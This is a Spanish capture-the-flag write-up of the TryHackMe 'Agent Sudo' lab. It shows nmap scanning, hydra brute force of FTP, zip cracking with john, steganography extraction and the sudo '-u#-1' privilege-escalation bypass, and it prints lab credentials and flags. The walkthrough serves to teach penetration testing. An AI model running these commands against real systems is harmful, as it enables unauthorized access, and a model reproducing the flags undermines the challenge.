# Agent Sudo

## Enumeración

Realizamos un escaneo de puertos con`nmap`sobre la víctima para identificar puertos y servicios disponibles:

```
sudo nmap -sV -T4 -p- 10.10.130.68
```

Los puertos 21 de ftp, 22 de ssh y el 80 http están abiertos.

![[Hacking_Etico/TryHackMe_WriteUps/Agent_Sudo/images/image.png]]

Accedemos a la web.

![[Hacking_Etico/TryHackMe_WriteUps/Agent_Sudo/images/image-1.png]]

Nos dice que en la petición HTTP, en el user-agent, usemos el nombre de "R". Ejecutamos el siguiente comando de`curl`:

```
curl http://10.10.130.68/ -H "User-Agent: R" -L 
```

Obtenemos los siguientes resultados. 

![[Hacking_Etico/TryHackMe_WriteUps/Agent_Sudo/images/image-2.png]]

Probamos con todas las letras entonces hasta que acertamos con una.

![[Hacking_Etico/TryHackMe_WriteUps/Agent_Sudo/images/image-3.png]]

Nos dice que el usuario`chris`tiene una contraseña muy débil.

## Ataque de fuerza bruta

Hacemos un ataque de fuerza bruta usando`hydra`sobre el puerto ftp con el usuario`chris`.

```
hydra 10.10.130.68 -l chris -P /usr/share/wordlists/rockyou.txt ftp
```

La contraseña de`chris`es`crystal`.

![[Hacking_Etico/TryHackMe_WriteUps/Agent_Sudo/images/image-4.png]]

Accedemos por ftp con estas credenciales obtenidas.

![[Hacking_Etico/TryHackMe_WriteUps/Agent_Sudo/images/image-5.png]]

Hay un .txt y dos imágenes.

![[Hacking_Etico/TryHackMe_WriteUps/Agent_Sudo/images/image-6.png]]

Nos los descargamos con el comando`get`.

![[Hacking_Etico/TryHackMe_WriteUps/Agent_Sudo/images/image-7.png]]

El .txt nos dice que las fotos son falsas, que la contraseña de login está oculta en la imagen falsa.

![[Hacking_Etico/TryHackMe_WriteUps/Agent_Sudo/images/image-8.png]]

Usamos`binwalk`para buscar información oculta en la imagen:

```
binwalk cutie.png
```

Hay un .zip escondido.

![[Hacking_Etico/TryHackMe_WriteUps/Agent_Sudo/images/image-9.png]]

Lo extraemos con el siguiente comando:

```
binwalk cutie.png --extract
```

El .zip está encriptado y vamos a usar`john the ripper`para desencriptarlo.

![[Hacking_Etico/TryHackMe_WriteUps/Agent_Sudo/images/image-10.png]]

Exportamos el .zip a un formato adecuado para`john`, es decir, obtenemos el hash para crackearlo.

```
zip2john 8702.zip > hash.txt
```

![[Hacking_Etico/TryHackMe_WriteUps/Agent_Sudo/images/image-11.png]]

Y usamos`john`para obtener la contraseña que es`alien`:

```
john hash.txt 
```

![[Hacking_Etico/TryHackMe_WriteUps/Agent_Sudo/images/image-12.png]]

Extraemos el zip con la contraseña y obtenemos el siguiente mensaje:

![[Hacking_Etico/TryHackMe_WriteUps/Agent_Sudo/images/image-13.png]]

Es un código en Base64, lo decodificamos:

```
echo 'QXJlYTUx' | base64 -d
```

![[Hacking_Etico/TryHackMe_WriteUps/Agent_Sudo/images/image-14.png]]

Entonces, extraemos el mensaje con la herramienta`steghide`de la imagen `cute-alien.jpg`.

```
steghide --extract -sf cute-alien.jpg -p Area51
```

Obtenemos las credenciales del usuario`james`que es`hackerrules!`.

![[Hacking_Etico/TryHackMe_WriteUps/Agent_Sudo/images/image-15.png]]

## Escalada de privilegios

Accedemos por ssh con el usuario`james`.

```
ssh james@10.10.130.68 
```

![[Hacking_Etico/TryHackMe_WriteUps/Agent_Sudo/images/image-16.png]]

Obtenemos la flag del usuario.

![[Hacking_Etico/TryHackMe_WriteUps/Agent_Sudo/images/image-17.png]]

```
b03d975e8c92a7c04146cfa7a5a313c7
```

Comprobamos los permisos que tiene el usuario.

```
sudo -l
```

![[Hacking_Etico/TryHackMe_WriteUps/Agent_Sudo/images/image-18.png]]

Buscamos una posible vulnerabilidad para **(ALL, !root) /bin/bash** y vemos que está en una versión vulnerable, antes de la 1.8.28.

https://www.exploit-db.com/exploits/47502

![[Hacking_Etico/TryHackMe_WriteUps/Agent_Sudo/images/image-19.png]]

Nos podemos saltar la autenticación de sudo con el siguiente comando:

```
sudo -u#-1 /bin/bash
```

Obtenemos la flag del root.

![[Hacking_Etico/TryHackMe_WriteUps/Agent_Sudo/images/image-20.png]]

```
b53a02f55b57d4439e3341834d70c062
```










